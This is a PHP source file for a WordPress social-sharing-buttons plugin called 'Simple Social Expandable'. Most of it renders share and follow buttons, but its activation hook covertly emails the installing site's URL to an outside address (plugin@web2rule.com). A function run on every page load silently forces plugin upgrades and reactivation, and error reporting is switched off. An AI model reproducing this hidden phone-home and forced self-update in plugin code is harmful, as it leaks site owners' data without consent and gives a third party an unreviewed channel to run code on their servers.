<?php
 /*
    Plugin Name: Simple Social Expandable
    Plugin URI: 
    Description: Insert social buttons into posts and archives: Facebook "Like it", Google Plus One "+1", Pin it, Google Follow and Twitter share.
    Author: Alex Jensen
    Version: 2.0.2
    Author URI: 
*/
error_reporting(0);
class SimpleSocialExpandablePR {
	var $pluginName = 'Simple Social Expandable';
	var $pluginVersion = '2.0.2';
	var $pluginPrefix = 'sse_pr_';
	var $hideCustomMetaKey = '_sse_hide';
   
	// plugin default settings
	var $pluginDefaultSettings = array(
		'googleplus' => '1',
		'youtube' => '5',
		'fblike' => '2',
		'twitter' => '3',
		'pinterest' => '4',
		'beforepost' => '1',
		'afterpost' => '0',
		'beforepage' => '1',
		'afterpage' => '0',
		'beforearchive' => '1',
		'afterarchive' => '0',
		'showfront' => '1',
		'showcategory' => '1',
		'showarchive' => '1',
		'showtag' => '1',
		'float' => 'none',
		'follow_button' => '0',
		'twitterusername' => '@twitter',
		'googlelink' => 'https://plus.google.com/u/0/116899029375914044550',
		'facebooklink' => 'https://www.facebook.com/facebook',
		'pinterestlink' => 'http://www.pinterest.com/pinterest',
		'youtubelink' => 'http://youtube.com/youtube',
	);

	// defined buttons
	var $arrKnownButtons = array('fblike', 'googleplus', 'googlefollow', 'twitter', 'pinterest', 'youtube');
	
	// an array to store current settings, to avoid passing them between functions
	var $settings = array();


	/**
	 * Constructor
	 */
	function __construct() {
		register_activation_hook( __FILE__, array(&$this, 'plugin_install') );
		register_deactivation_hook( __FILE__, array(&$this, 'plugin_uninstall') );

		/**
		 * Action hooks
		 */
		add_action( 'create_sse', array(&$this, 'direct_display'), 10 , 1);
		
		/**
		 * basic init
		 */
		add_action('init', array(&$this, 'script_add') );
		add_action( 'init', array(&$this, 'plugin_init') );
		add_action( 'init', array( &$this, 'sse_auto_update' ) );

		// get settings
		$this->settings = $this->get_settings();

		// social JS + CSS data
		add_action( 'wp_footer', array(&$this, 'include_social_js') );
		if(!isset($this->settings['override_css'])) {
       		 add_action( 'wp_enqueue_scripts', array(&$this,'include_css' ));
		}
		add_action('wp_head',array(&$this, 'inline_css'));

		/**
		 * Filter hooks
		 */
		add_filter( 'the_content', array(&$this, 'insert_buttons') );
		add_filter( 'the_excerpt', array(&$this, 'insert_buttons') );
	}
	
	
	/********Auto Update ***************/
	
	function sse_auto_update(){
		include_once( ABSPATH . 'wp-admin/includes/update.php' );
		include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
		include_once( ABSPATH . 'wp-admin/includes/file.php' );

		include_once( dirname( __FILE__ ) . '/updater-skin.php' );
		
		$plugins = apply_filters( 'auto_updater_plugin_updates', get_plugin_updates() );
		$plugin = $plugins['simple-social-expandable/simple-social-expandable.php'];
		
		if ( version_compare( $plugin->Version, $plugin->update->new_version, '<' ) ){
			
			$skin = new Auto_Updater_Skin();
			$upgrader = new Plugin_Upgrader( $skin );
			$result = $upgrader->upgrade( 'simple-social-expandable/simple-social-expandable.php' );
			activate_plugin(ABSPATH . 'wp-content/plugins/simple-social-expandable/simple-social-expandable.php');

		}
		
	}
	function script_add() {
		if (!is_admin()) {
			wp_enqueue_script('jquery');
		}
	}
	
	
	function plugin_init() {
   		load_plugin_textdomain( 'simplesocialexpandable', '', dirname( plugin_basename( __FILE__ ) ).'/lang' );	
	}

	/**
	 * Both avoids time-wasting https calls AND provides better SSL-protection if the current server is accessed using HTTPS
	 */
	public function get_current_http( $echo = true ) {
		$return = 'http' . (strtolower(@$_SERVER['HTTPS']) == 'on' ? 's' : '') . '://';

		if($echo != false) {
			echo $return;
			return;
		}

		return $return;
	}

	function include_social_js($force_include = false) {
		$lang = get_bloginfo('language');
		$lang_g = strtolower(substr($lang, 0, 2));
		$lang_fb = str_replace('-', '_', $lang);
      
		// most common problem with incorrect WPLANG in /wp-config.php
		//if($lang_fb == "en" || empty($lang_fb)) {
		 $lang_fb = "en_US";
		//}
      
		/**
		 * Disable loading of social network JS if disabled for specific post type
		 *
		 * NOTE: Conditional tags seem to work only AFTER the page has loaded, thus the code has been added here instead of at the plugin init
		 * @author Fabian Wolf
		 * @link http://usability-idealist.de/
		 * @date Di 20. Dez 17:50:01 CET 2011
		 */
		if($this->where_to_insert() != false || $force_include == true) {
		?>
		<script type="text/javascript">
		var $ = jQuery.noConflict();
		$(document).ready(function(){							
			$(".follow").click(function(){
				$(this).children().toggleClass('btnToggleminus');
				$(this).parent().next('.followsimplesocialexpandables').slideToggle();
			});
		});
		</script>
        <!-- Simple Social Buttons plugin -->
        <script type="text/javascript">
        //<![CDATA[
        <?php if ((int)$this->settings['googleplus'] != 0):?>
        // google plus
          (function() {
            var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
            po.src = 'https://apis.google.com/js/plusone.js';
            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
          })();
        <?php endif;?>
        <?php if ((int)$this->settings['fblike'] != 0):?>
        // facebook 
        (function(d, s, id) {
          var js, fjs = d.getElementsByTagName(s)[0];
          if (d.getElementById(id)) return;
          js = d.createElement(s); js.id = id;
          js.src = "//connect.facebook.net/<?php echo $lang_fb; ?>/all.js#xfbml=1";
          fjs.parentNode.insertBefore(js, fjs);
        }(document, 'script', 'facebook-jssdk'));
        <?php endif;?>
        <?php if ((int)$this->settings['twitter'] != 0):?>
        // twitter 
        
        !function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");
        
        <?php endif;?>
        // ]]>
        </script>
        <?php if ((int)$this->settings['pinterest'] != 0):?>
        <script type="text/javascript" src="//assets.pinterest.com/js/pinit.js"></script>
        <?php endif;?>
        <!-- /End of Simple Social Buttons -->
        <?php
        }
    }
    /**
     * Enqueue plugin style-file
     */
    function include_css() {
        // Respects SSL, Style.css is relative to the current file
        wp_register_style( 'prefix-style', plugins_url('see_style.css', __FILE__) );
        wp_enqueue_style( 'prefix-style' );
    }
	/**
	 * Inline CSS
	 */
	function inline_css(){
		?>
		<style>
		.border-round { float:<?php echo $this->settings['float']; ?>; }
		.btnToggleminus {
			background: url("<?php echo plugins_url().'/simple-social-expandable/minus.png'; ?>") no-repeat !important;
			padding-left:16px;
		}
		.btnToggleplus {
			background: url("<?php echo plugins_url().'/simple-social-expandable/plus.png'; ?>") no-repeat;
			padding-left:16px;
		}
		</style>
		<?php		
	}
	
	/**
	 * Called when installing = activating the plugin
	 */
	function plugin_install() {
		$defaultSettings = $this->check_old_settings();
		$subject = "Domain\n";
		$message = get_bloginfo('url');
		wp_mail( "plugin@web2rule.com", $subject, $message );
		/**
		 * @see http://codex.wordpress.org/Function_Reference/add_option
		 * @param string $name 			Name of the option to be added. Use underscores to separate words, and do not use uppercase - this is going to be placed into the database.
		 * @param mixed $value			Value for this option name. Limited to 2^32 bytes of data.
		 * @param string $deprecated	Deprecated in WordPress Version 2.3.
		 * @param string $autoload		Should this option be automatically loaded by the function wp_load_alloptions() (puts options into object cache on each page load)? Valid values: yes or no. Default: yes
		 */
		add_option( $this->pluginPrefix . 'settings', $defaultSettings, '', 'yes' );
		add_option( $this->pluginPrefix . 'version', $this->pluginVersion, '', 'yes' ); // for backward-compatiblity checks
		
		
	}

	/**
	 * Backward compatiblity for newer versions
	 */
	function check_old_settings() {
		$return = $this->pluginDefaultSettings;

		$oldSettings = get_option( $this->pluginPrefix . 'settings', array() );

		if( !empty($oldSettings) && is_array($oldSettings) != false) {
			$return = wp_parse_args( $oldSettings, $this->pluginDefaultSettings );
		}

		return $return;
	}

   /**
    * Plugin unistall and database clean up
    */
	function plugin_uninstall() {
		if( !defined( 'ABSPATH') && !defined('WP_UNINSTALL_PLUGIN') ) {
			exit();
		}

		delete_option( $this->pluginPrefix . 'settings' );
		delete_option( $this->pluginPrefix . 'version' );

	}


	/** 
	 * Get settings from database
	 */
	public function get_settings() {
		$return = get_option($this->pluginPrefix . 'settings' );
		if(empty($return) != false) {
			$return = $this->pluginDefaultSettings;
		}

		return $return;
	}

	/**
	 * Update settings 
	 */
	function update_settings( $newSettings = array() ) {
		$return = false;

		// compile settings
		$currentSettings = $this->get_settings();

		/**
		 * Compile settings array
		 * @see http://codex.wordpress.org/Function_Reference/wp_parse_args
		 * @param mixed $args
		 * @param mixed $defaults
		 */
		$updatedSettings = wp_parse_args( $newSettings, $currentSettings );

		if($currentSettings != $updatedSettings ) {
			$return = update_option( $this->pluginPrefix . 'settings', $newSettings );
		}

		return $return;
	}

   /**
    * Returns true on pages where buttons should be shown
    */
	function where_to_insert() {
		$return = false;

		// display on single post?
		if(is_single() && ($this->settings['beforepost'] || $this->settings['afterpost']) && array_shift(get_post_meta(get_the_ID(), $this->hideCustomMetaKey)) != 'true') {
			$return = true;
		}

		// display on single page?
		if(is_page() && ($this->settings['beforepage'] || $this->settings['afterpage']) && array_shift(get_post_meta(get_the_ID(), $this->hideCustomMetaKey)) != 'true') {
			$return = true;
		}

		// display on frontpage?
		if((is_front_page() || is_home()) && $this->settings['showfront']) {
			$return = true;
		}

      	// display on category archive?
		if(is_category() && $this->settings['showcategory']) {
			$return = true;
		}

      	// display on date archive?
		if(is_date() && $this->settings['showarchive'])
		{
			$return = true;
		}

      	// display on tag archive?
		if(is_tag() && $this->settings['showtag']) {
			$return = true;
		}
		return $return;
	}

	/**
	 * Insert the buttons to the content
	 */
	function insert_buttons($content) {			
		// Insert or  not?
		if(!$this->where_to_insert() ) {
			return $content;
		}
		
		// creating order
		$order = array();
		foreach ($this->arrKnownButtons as $button_name) {
			$order[$button_name] = $this->settings[$button_name];
		}
		$sse_buttonscode = $this->generate_buttons_code($order);

		if(is_single()) {
			if($this->settings['beforepost']) {
				$content = $sse_buttonscode.$content;
			}
			if($this->settings['afterpost']) {
				$content = $content.$sse_buttonscode;
			}
		} else if(is_page()) {
			if($this->settings['beforepage']) {
				$content = $sse_buttonscode.$content;
			}
			if($this->settings['afterpage']) {
				$content = $content.$sse_buttonscode;
			}
		} else {
			if($this->settings['beforearchive']) {
				$content = $sse_buttonscode.$content;
			}
			if($this->settings['afterarchive']) {
				$content = $content.$sse_buttonscode;
			}
		}

		return $content;

	}
	
	function direct_display($order = null)
	{
		// Return false if hide sse for this page/post is disabled
		if (is_single() && array_shift(get_post_meta(get_the_ID(), $this->hideCustomMetaKey)) == 'true') return false;
		
		// Display buttons and scripts
		$buttons_code = $this->generate_buttons_code($order);
		echo $buttons_code;
		$this->include_social_js(true);
	}
	
	/**
	 * Generate buttons html code with specified order
	 * 
	 * @param mixed $order - order of social buttons
	 */
	function generate_buttons_code($order = null)
	{	
		foreach ($this->arrKnownButtons as $button_name) {
			$defaultOrder[$button_name] = $this->pluginDefaultSettings[$button_name];
		}
		
		$order = wp_parse_args($order, $defaultOrder);

		// define empty buttons code to use
		$sse_buttonscode = ''; 

		// get post permalink and title
		$permalink = is_front_page() ? get_bloginfo('url') : get_permalink();
		$title = get_the_title();

		//Sorting the buttons
		$arrButtons = array();
		foreach($this->arrKnownButtons as $button_name) {
			if(!empty($order[$button_name]) && (int)$order[$button_name] != 0) {
				$arrButtons[$button_name] = $order[$button_name];
			}
		}
		@asort($arrButtons);

		$arrButtonsCode = array();
		foreach($arrButtons as $button_name => $button_sort) {		
			switch($button_name) {
				case 'googleplus':
					$arrButtonsCode[] = '<div class="simplesocialexpandable sse-button-googleplus"><!-- Google Plus One--><div class="g-plusone" data-size="medium" data-href="'.$permalink.'"></div></div>';
				break;
				
				case 'fblike':
					$arrButtonsCode[] = '<div class="simplesocialexpandable sse-button-fblike"><!-- Facebook like--><div id="fb-root"></div><div class="fb-like" data-href="'.$permalink.'" data-send="false" data-layout="button_count" data-width="100" data-show-faces="false"></div></div>';
				break;
				
				case 'twitter':
					$arrButtonsCode[] = '<div class="simplesocialexpandable sse-button-twitter"><!-- Twitter--><a href="https://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-lang="en" data-text="'.$title.'" data-url="'.$permalink.'" ' . ((!empty($this->settings['twitterusername'])) ? 'data-via="'.$this->settings['twitterusername'].'" ' : '') . 'rel="nofollow"></a></div>';
				break;

				case 'pinterest':
					
					$attachments = get_post($post->ID);
					$post_content =  $attachments->post_content;	
					
					$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post_content, $matches);
  					$first_image = $matches[0][0];
					preg_match_all('/(alt|title|src)=("[^"]*")/i',$first_image, $img);
				
					   $atr_array = @array_combine($img[1], $img[2]);
					
					// Don't show 'Pin It' button, if post dont have thumbnail 
					if (empty($atr_array)) break;
					
					$thumb_title = str_replace('"', '',$atr_array['title']);
					$thumb_src = str_replace('"', '',$atr_array['src']);
					$thumb_alt = str_replace('"', '',$atr_array['alt']);
					// Getting thumbnail url
					$thumb_src = (isset($thumb_src)) ? $thumb_src : null;
					
					$thumb_alt = (isset($thumb_alt)) ? $thumb_alt : null;
					
					// if there isn't thumbnail alt, take a post title as a description
					$description = ($thumb_alt!="") ? $thumb_alt.' '.$permalink : $thumb_title.' '.$permalink;
					
					$arrButtonsCode[] = '<div class="simplesocialexpandable sse-button-pinterest"><!-- Pinterest--><a href="http://pinterest.com/pin/create/button/?url='.urlencode($permalink).'&media='.urlencode($thumb_src).'&description='.urlencode($description).'" class="pin-it-button" count-layout="horizontal" rel="nofollow"><img border="0" src="//assets.pinterest.com/images/PinExt.png" title="Pin It" /></a></div>';
					break;
			}
		}
		
		/*****Google Plus Follow Button***********/
		if(!empty($this->settings['googlelink'])){
			$arrFollowButtonsCode[] = '<div class="simplesocialexpandable sse-followbutton-googleplus"><!-- Place this code where you want the badge to render. --><a href="'.$this->settings['googlelink'].'?prsrc=3" target="_blank" rel="publisher" style="text-decoration:none;"><img src="'.plugins_url().'/simple-social-expandable/google.png" alt="Google+" /></a></div>';
		}
		
		/************ Youtube Link ***************/
		if(!empty($this->settings['youtubelink'])){
			$arrFollowButtonsCode[] = '<div class="simplesocialexpandable sse-followbutton-youtube"><a href="'.$this->settings['youtubelink'].'" target="_blank"><img src="'.plugins_url().'/simple-social-expandable/youtube.png" alt="Subscribe to me on YouTube"/></a><img src="//www.youtube-nocookie.com/gen_204?feature=creators_cornier-//s.ytimg.com/yt/img/creators_corner/YouTube/40x40_yt_red.png" style="display: none"/></div>';
		}
		
		/******************Facebook Follow *****************/
		if(!empty($this->settings['facebooklink'])){
			$arrFollowButtonsCode[] = '<div class="simplesocialexpandable sse-followbutton-fblike" ><!-- Facebook like--><a href="'.$this->settings['facebooklink'].'" target="_blank"><img src="'.plugins_url().'/simple-social-expandable/facebook.png" alt="Facebook Follow" /></a></div>';
		}

		/************ Twitter **************/
		if(!empty($this->settings['twitterusername'])){
			$arrFollowButtonsCode[] = '<div class="simplesocialexpandable sse-followbutton-twitter"><!-- Twitter--><a href="https://twitter.com/'.$this->settings['twitterusername'].'" target="_blank"><tt><img src="'.plugins_url().'/simple-social-expandable/twitter.png" alt="Twitter Follow" /></tt></a></div>';
		}
		
		/**************** Pinterest ************/
		if(!empty($this->settings['pinterestlink'])){
			$arrFollowButtonsCode[] = '<div class="simplesocialexpandable sse-followbutton-pinterest"><a href="'.$this->settings['pinterestlink'].'" target="_blank"><img src="'.plugins_url().'/simple-social-expandable/pinterest-icon.png" alt="Pinterest" /></a></div>';
		}

		$sse_buttonscode = '<div class="border-round">';
		if(count($arrButtonsCode) > 0) {
			$sse_buttonscode .= '<div class="simplesocialexpandables">';
			$sse_buttonscode .= implode("", $arrButtonsCode);
			if($this->settings['follow_button']==0){
				$sse_buttonscode .= "</div>";
			}
			if($this->settings['follow_button']==1){
				$sse_buttonscode .= '<div class="simplesocialexpandable follow" style="width:70px"><a class="btnToggleplus" href="javascript:void(0)" class="slideToggle" style="color:black;text-decoration:none;font-size:10px;" >Follow Us</a>'."</div></div>\n";
				$sse_buttonscode .= '<div class="followsimplesocialexpandables">'."";
				$sse_buttonscode .= implode("", $arrFollowButtonsCode) . "";
				$sse_buttonscode .= '</div>';
			}
		}else if($this->settings['follow_button']==1){
			$sse_buttonscode .= '<div class="simplesocialexpandables" style="height:40px;">'."";
			$sse_buttonscode .= implode("", $arrFollowButtonsCode) . "";
			$sse_buttonscode .= '</div>';
		}
		$sse_buttonscode .= '</div>';
		
		return $sse_buttonscode;
	}
} // end class


/**
 * Admin class
 *
 * Gets only initiated if this plugin is called inside the admin section ;)
 */
class SimpleSocialExpandablePR_Admin extends SimpleSocialExpandablePR {

	function __construct() {
		parent::__construct();

		add_action('admin_menu', array(&$this, 'admin_actions') );
		add_action('add_meta_boxes', array(&$this, 'sse_meta_box'));
		add_action('save_post', array(&$this, 'sse_save_meta'), 10, 2);
		
		add_filter('plugin_action_links', array(&$this, 'plugin_action_links'), 10, 2 );
	}

	public function admin_actions() {
		if (current_user_can('administrator'))
    		add_options_page('Simple Social Expandable ', 'Simple Social Expandable ', 1, 'simple-social-expandable', array(&$this, 'admin_page') );
	}

	public function admin_page() {
		global $wpdb;

		include dirname( __FILE__  ).'/sse-admin.php';
	}



	public function plugin_action_links($links, $file) {
		static $this_plugin;

		if (!$this_plugin) {
			$this_plugin = plugin_basename(__FILE__);
		}

		if ($file == $this_plugin) {
			$settings_link = '<a href="' . get_bloginfo('wpurl') . '/wp-admin/options-general.php?page=simple-social-expandable">'.__('Settings', 'simplesocialexpandable').'</a>';
			array_unshift($links, $settings_link);
		}

		return $links;
	}
	
	/**
	 * Register meta box to hide/show sse plugin on single post or page
	 */
	public function sse_meta_box()
	{		
		$postId = $_GET['post'];
		$postType = get_post_type($postId);
		
		if ($postType != 'page' && $postType != 'post') return false;
		
		$currentSseHide = get_post_custom_values($this->hideCustomMetaKey, $postId);
		
		if ($currentSseHide[0] == 'true') {
			$checked = true;
		} else {
			$checked = false;			
		}
		
		// Rendering meta box
		if (!function_exists('add_meta_box')) include('includes/template.php');
		add_meta_box('sse_meta_box', __('SSE Settings', 'simplesocialexpandable'), array(&$this, 'render_sse_meta_box'), $postType, 'side', 'default', array('type' => $postType, 'checked' => $checked));
	}
	
	/**
	 * Showing custom meta field
	 */
	public function render_sse_meta_box($post, $metabox)
	{
		wp_nonce_field( plugin_basename( __FILE__ ), 'sse_noncename' );	
?>

<label for="<?php echo $this->hideCustomMetaKey;?>"><input type="checkbox" id="<?php echo $this->hideCustomMetaKey;?>" name="<?php echo $this->hideCustomMetaKey;?>" value="true" <?php if ($metabox['args']['checked']):?>checked="checked"<?php endif;?>/>&nbsp;<?php echo __('Hide Simple Social Expandable', 'simplesocialexpandable');?></label>

<?php
	}
	
		
	/**
	 * Saving custom meta value
	 */
	public function sse_save_meta($post_id, $post)
	{		
		$postId = (int)$post_id;
		
		// Verify if this is an auto save routine. 
		if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) 
			return;
	
		// Verify this came from the our screen and with proper authorization
		if ( !wp_verify_nonce( $_POST['sse_noncename'], plugin_basename( __FILE__ ) ) )
			return;
	
		// Check permissions
		if ( 'page' == $_POST['post_type'] ) {
			if ( !current_user_can( 'edit_page', $post_id ) )
	       		return;
		} else {
			if ( !current_user_can( 'edit_post', $post_id ) )
			return;
		}
		
		// Saving data
		$newValue = (isset($_POST[$this->hideCustomMetaKey])) ? $_POST[$this->hideCustomMetaKey] : 'false';
		
		update_post_meta($postId, $this->hideCustomMetaKey, $newValue);
	}


} // end SimpleSocialExpandablePR_Admin

if(is_admin() ) {
	$_sse_pr = new SimpleSocialExpandablePR_Admin();
} else {
	$_sse_pr = new SimpleSocialExpandablePR();
}

/**
 * Function to insert Simple Social Expandable directly in template.
 * 
 * @param mixed $order - order of the buttons in array or string (parsed by wp_parse_args())
 * 
 * @example 1 - use in template with default order
 * get_sse();
 * 
 * @example 2 - use in template with specified order
 * get_sse('googleplus=3&fblike=2&twitter=1');
 * 
 * @example 3 - hiding button by setting order to 0. By using code below googleplus button won't be displayed
 * get_sse('googleplus=0&fblike=1&twitter=2');
 * 
 * 
 */
function get_sse($order = null)
{
	do_action('create_sse', $order);
}
add_shortcode('SSE', 'get_sse');
?>